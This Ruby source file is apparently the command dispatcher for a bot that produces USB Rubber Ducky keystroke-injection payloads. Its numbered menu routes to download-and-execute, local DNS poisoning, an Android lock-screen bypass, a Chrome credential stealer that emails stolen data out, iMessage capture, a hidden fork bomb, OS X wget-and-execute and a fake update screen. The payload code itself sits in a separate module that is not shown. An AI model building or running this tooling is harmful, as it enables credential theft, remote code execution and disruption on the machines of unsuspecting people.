require_relative 'ducky'
require 'fileutils'
class DuckyOptions
	
	def self.options(num, options, uid)
		case num
        when "1"
            # DownloadAndExecute
            url      = options[1]
	        fileName = options[0]
	        # checks if its nil
	        # if it is not, returns example
	        if url.nil? or  fileName.nil?
	            return "example:```.ducky 1; 127.0.0.1; file;```"
	        end
	        Ducky.downloadAndExecute(url, fileName, uid)
	    when "2"
	        ShutDownWin10(uid)
	    when "3"
	        site = options[1]
	        ip   = options[2]
	        if site.nil? or ip.nil? 
	            return "example: ``` .ducky 3; site; ip;```"
	        end
	        Ducky.localDNSPoison(site, ip, uid)
	    when "4"
	        Ducky.android5xUnlock(uid)
	    when "5"
	        Ducky.win7LogOff(uid)
	    when "6"
	        email = options[1]
	        toEmail = options[2]
	        if email.nil? or toEmail.nil? 
	            return "Example:  ```.ducky 6; email, toEmail;```"
	       end
	       Ducky.chromeStealer(uid, email, toEmail)
	       
	    when "7"
	        channelId = options[1]
	        if channelId.nil? 
	            return "example: ```.ducky 7; channelId;```"
	        end
	        Ducky.youtubeSub(uid, channelId)
	    when "8"
	        site = options[1]
	        if site.nil?
	            return "Example: ```.ducky 8; site;```"
	        end
	        Ducky.chromeHomePage(uid, site)
	    when "9"
	        Ducky.invisibleForkBomb(uid)
	    when "10"
	        Ducky.oSXWgetAndExecute(uid)
	    when "11"
	        Ducky.osxIMessageCapature(uid)
	    when "12"
	        Ducky.fakeUpdateScreen(uid)
	    when "13"
	        Ducky.rickRolll(uid)
	    when "14"
	        Ducky.xmas(uid)
	    when "15"
	        Ducky.anti_browser(uid)
	    when "16"
	        acc_name    = options[1]
	        acc_pass    = options[0]
	        # checks if its nil
	        # if it is not, returns example
	        if acc_pass.nil? or  acc_name.nil?
	            return "example:```.ducky 16; username; pass;```"
	        end
	    end
	end
end
DuckyOptions.options("1", ["127.0.0.1", "boobs"], "123")